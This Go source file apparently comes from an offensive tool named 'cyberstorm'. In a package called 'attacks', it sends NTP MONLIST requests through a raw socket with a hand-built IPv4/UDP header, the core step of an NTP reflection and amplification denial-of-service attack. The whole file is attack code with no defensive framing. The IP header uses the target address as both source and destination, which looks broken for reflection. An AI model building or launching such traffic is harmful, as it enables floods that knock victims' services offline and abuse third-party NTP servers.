package attacks

import (
	"fmt"
	"cyberstorm/core"
	"net"
)

// SendNTPAmplification invia una richiesta NTP MONLIST all'indirizzo di destinazione
func SendNTPAmplification(rawSocket core.RawSocket, dstIp net.IP, dstPort uint16) error {
	packet := core.BuildNTPMonlistRequest()
	ipv4Header := core.GetIPV4Header(dstIp, dstIp, len(packet), 17) // Protocol 17 for UDP
	ipv4HeaderBytes, _ := ipv4Header.Marshal()

	data := append(ipv4HeaderBytes, packet...)
	if err := rawSocket.Send(data); err != nil {
		return fmt.Errorf("send data to: %w", err)
	}
	return nil
}
